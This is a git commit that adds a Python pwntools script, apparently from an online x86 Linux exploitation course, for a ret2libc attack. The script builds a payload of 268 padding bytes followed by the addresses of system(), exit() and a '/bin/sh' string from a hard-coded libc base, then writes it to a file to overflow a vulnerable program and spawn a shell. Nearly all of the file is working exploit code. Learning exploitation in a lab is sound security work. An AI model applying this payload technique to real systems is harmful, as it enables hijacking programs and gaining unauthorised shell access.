310677b6679f78a18b5dad43c359a210ec29d9c0
kali <kali@kali.localhost>
2024-09-05 17:30:52 +0200

    modified stuff in nx_ret2libc folder

---
+++ classes/UDEMY/x86_linux/nx_ret2libc/ret2libc.py
@@ -0,0 +1,27 @@
+#!/usr/bin/python3
+from pwn import *
+
+junk = b"A" * 268
+
+#eip = b"\x90\x7d\xdc\xf7"
+#eip = struct.pack("<I", 0xf7dc7d00)
+
+# address of exit() 0xf7db7220
+#ret = b"BBBB"
+
+#binsh = b"\xcd\x3d\xf3\xf7"
+#binsh = struct.pack("<I", 0xf7d7a000 + 0x1b9dcd)
+
+libc = ELF("/usr/lib32/libc.so.6")
+libc_base = 0xf7d7a000
+
+system_addr = p32(libc_base + libc.sym["system"])
+exit_addr = p32(libc_base + libc.sym["exit"])
+binsh_addr = p32(0xf7f33dcd)
+
+#print(system_addr, exit_addr, binsh_addr)
+
+payload = junk + system_addr + exit_addr + binsh_addr 
+
+with open("payload", "wb") as f:
+    f.write(payload)
